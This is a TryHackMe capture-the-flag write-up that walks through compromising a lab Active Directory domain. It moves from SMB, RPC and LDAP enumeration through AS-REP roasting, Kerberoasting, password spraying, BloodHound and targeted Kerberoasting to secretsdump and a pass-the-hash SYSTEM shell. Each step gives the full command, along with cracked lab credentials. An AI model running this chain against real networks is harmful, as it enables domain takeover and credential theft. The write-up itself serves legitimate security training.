# Operation Endgame

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/operationendgame" %}

***

An initial scan using `RustScan` and `Nmap` identified multiple services associated with Active Directory infrastructure.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap -sV -sC -Pn 10.48.188.197 -T4 -A
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Add The Domain and DNS name in the `hosts` file !

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

I got the default Shares !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
smbclient -L \\10.48.188.197\ -N
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Null `rpc` services for enumeration the users !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
rpcclient -U "" -N 10.48.188.197
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Check for the all rid values and also paste these username inside the `users.txt` file !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc smb 10.48.188.197 -u 'guest' -p '' --rid-brute
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Check The Users Using `LDAP` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc ldap 10.48.188.197 -u 'guest' -p '' --users
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Make The List Using `LDAP` Services !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc ldap 10.48.188.197 -u 'guest' -p '' --users > users.txt
cat users.txt | awk '{print $5}' > names.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Then i did the AS-REP Roasting but hashes is not `crackable` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-GetNPUsers thm.local/ -no-pass -usersfile names.txt -dc-ip 10.48.188.197
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Try `Kerberoasting` using The Guest Account and It's work !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-GetUserSPNs -dc-ip 10.48.188.197 thm.local/guest -request
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Crack The Hash Using John !

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Check The Valid Credentials !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc smb 10.48.188.197 -u CODY_ROY -p 'MKO)mko0'
nxc  rdp  10.48.188.197 -u CODY_ROY -p 'MKO)mko0'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Then again make the users lists using with valid credentials !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc ldap  10.48.188.197 -u CODY_ROY -p 'MKO)mko0' --users > users.txt
cat users.txt | awk '{print $5}' > names.txt
```
{% endcode %}

Password spraying work !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
kerbrute passwordspray --dc 10.48.188.197 -d thm.local names.txt "MKO)mko0"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Bloodhound for the best enumeration and find the attack path !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo bloodhound-python -d thm.local -u ZACHARY_HUNT -p 'MKO)mko0' -ns 10.48.188.197 -c all --zip
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

BloodHound analysis of ZACHARY\_HUNT revealed: `GenericWrite`

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Trying Kerberoasting Attack !

{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
python targetedKerberoast.py -d thm.local -u ZACHARY_HUNT -p 'MKO)mko0' --dc-ip 10.48.163.237 --request-user JERRI_LANCASTER
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

Crack The Hash Using John !

<figure><img src="../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

Check The Credential it's valid or not !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc smb 10.48.163.237 -u JERRI_LANCASTER -p 'lovinlife!'
nxc rdp  10.48.163.237 -u JERRI_LANCASTER -p 'lovinlife!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

Interact With The `rdp` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
xfreerdp3 /u:JERRI_LANCASTER /p:'lovinlife!' /v:10.48.163.237 /dynamic-resolution +clipboard /cert:ignore /drive:shared,/home/kali/ctf
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Check The Credential it's valid or not and luckily we are a local domain admin !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc smb 10.48.163.237 -u 'SANFORD_DAUGHERTY' -p "RESET_ASAP123"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

Dump The hashes using `impacket-secretsdump`&#x20;

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-secretsdump thm.local/SANFORD_DAUGHERTY:'RESET_ASAP123'@10.48.163.237 -just-dc
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

Use The `impacket-smbexec` for the SYSTEM Level Shell !&#x20;

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-smbexec-k -hashes :e599bf2fe56d6a21b3a5487bb4761d1b thm.local/Administrator@ad.thm.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>
